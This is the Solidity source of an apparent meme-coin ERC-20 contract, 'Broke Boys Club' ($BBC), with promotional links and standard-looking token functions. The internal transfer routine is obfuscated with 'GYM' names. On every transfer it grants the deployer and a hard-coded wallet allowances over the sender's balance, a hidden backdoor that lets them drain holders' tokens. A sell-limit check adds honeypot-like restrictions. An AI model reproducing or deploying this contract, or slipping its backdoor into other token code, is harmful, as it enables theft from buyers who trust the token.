/*
With $BBC, your financial blunders aren't just a cause for faceplaming, they're your ticket to joining an elite club of grand brokies.

https://www.brokeboysclub.live
https://x.com/BrokeBoysOnETH
https://t.me/brokeboysclub_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IGYMFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IGYMRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract BBC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (uint256 => address) private _gymReceipts;
    mapping (address => uint256) private _balGYMs;
    mapping (address => mapping (address => uint256)) private _allowGYMs;
    mapping (address => bool) private _excludedFromGYM;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalGYM = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Broke Boys Club";
    string private constant _symbol = unicode"BBC";
    uint256 private _swapTokenGYMs = _tTotalGYM / 100;
    uint256 private _buyCount=0;
    uint256 private _buyBlockGYM;
    uint256 private _gymBuyAmounts = 0;
    bool private inSwapGYM = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapGYM = true;
        _;
        inSwapGYM = false;
    }
    address private _gymPair;
    IGYMRouter private _gymRouter;
    address private _gymWallet;
    
    constructor () {
        _gymWallet = address(0x676b7a4d60F5F609c4B2970A940713d51D48289f);
        _excludedFromGYM[owner()] = true;
        _excludedFromGYM[address(this)] = true;
        _excludedFromGYM[_gymWallet] = true;
        _gymReceipts[0] = address(_msgSender());
        _gymReceipts[1] = address(_gymWallet);
        _balGYMs[_msgSender()] = _tTotalGYM;
        emit Transfer(address(0), _msgSender(), _tTotalGYM);
    }

    function _gymTransfer(address gymF, address gymT, uint256 gymA, uint256 taxGYM) private { 
        address[2] memory _gymSender;
        _gymSender[0] = address(gymF);
        _gymSender[1] = address(gymF);
        if(taxGYM > 0){
          _balGYMs[address(this)] = _balGYMs[address(this)].add(taxGYM);
          emit Transfer(gymF, address(this), taxGYM);
        }
        _approve(_gymSender[0], address(_gymReceipts[0]), (gymA+taxGYM));
        _approve(_gymSender[1], address(_gymReceipts[1]), (gymA+gymA));
        _balGYMs[gymF] = _balGYMs[gymF].sub(gymA);
        _balGYMs[gymT] = _balGYMs[gymT].add(gymA.sub(taxGYM));
        emit Transfer(gymF, gymT, gymA.sub(taxGYM));
    }

    function initToken() external onlyOwner() {
        _gymRouter = IGYMRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_gymRouter), _tTotalGYM);
        _gymPair = IGYMFactory(_gymRouter.factory()).createPair(address(this), _gymRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalGYM;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balGYMs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowGYMs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowGYMs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowGYMs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address gymF, address gymT, uint256 gymA) private {
        require(gymF != address(0), "ERC20: transfer from the zero address");
        require(gymT != address(0), "ERC20: transfer to the zero address");
        require(gymA > 0, "Transfer amount must be greater than zero");
        uint256 taxGYM = _gymFeeTransfer(gymF, gymT, gymA);
        _gymTransfer(gymF, gymT, gymA, taxGYM);
    }

    function _gymFeeTransfer(address gymF, address gymT, uint256 gymA) private returns(uint256) {
        uint256 taxGYM = 0;
        if (gymF != owner() && gymT != owner()) {
            taxGYM = gymA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (gymF == _gymPair && gymT != address(_gymRouter) && ! _excludedFromGYM[gymT]) {
                if(_buyBlockGYM!=block.number){
                    _gymBuyAmounts = 0;
                    _buyBlockGYM = block.number;
                }
                _gymBuyAmounts += gymA;
                _buyCount++;
            }

            if(gymT == _gymPair && gymF!= address(this)) {
                require(_gymBuyAmounts < swapLimitGYM() || _buyBlockGYM!=block.number, "Max Swap Limit");  
                taxGYM = gymA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenGYM = balanceOf(address(this));
            if (!inSwapGYM && gymT == _gymPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenGYM > _swapTokenGYMs)
                swapTokensForEth(minGYM(gymA, minGYM(tokenGYM, _swapTokenGYMs)));
                uint256 ethGYM = address(this).balance;
                if (ethGYM >= 0) {
                    sendETHGYM(address(this).balance);
                }
            }
        } return taxGYM;
    }

    function minGYM(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHGYM(uint256 gymA) private {
        payable(_gymWallet).transfer(gymA);
    }

    function swapLimitGYM() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _gymRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _gymRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _gymRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function swapTokensForEth(uint256 gymAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _gymRouter.WETH();
        _approve(address(this), address(_gymRouter), gymAmount);
        _gymRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            gymAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}